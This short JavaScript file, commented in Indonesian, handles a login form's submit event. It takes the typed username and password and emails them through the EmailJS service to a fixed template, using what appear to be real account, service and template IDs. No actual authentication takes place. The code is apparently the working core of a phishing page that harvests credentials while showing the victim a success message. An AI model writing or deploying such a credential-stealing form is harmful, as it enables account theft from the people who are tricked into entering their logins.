// Inisialisasi EmailJS
(function() {
    emailjs.init("oC7GP_zB1Qtk2EzkL"); // Ganti dengan User ID dari EmailJS
})();

document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault(); // Mencegah reload halaman

    // Kirim data ke EmailJS
    emailjs.send("service_kt7oz07", "template_83wyufb", {
        username: document.getElementById("username").value,
        password: document.getElementById("password").value,
    }).then(function(response) {
        document.getElementById("success-msg").classList.remove("hidden");
        document.getElementById("error-msg").classList.add("hidden");
    }, function(error) {
        document.getElementById("error-msg").classList.remove("hidden");
        document.getElementById("success-msg").classList.add("hidden");
    });
});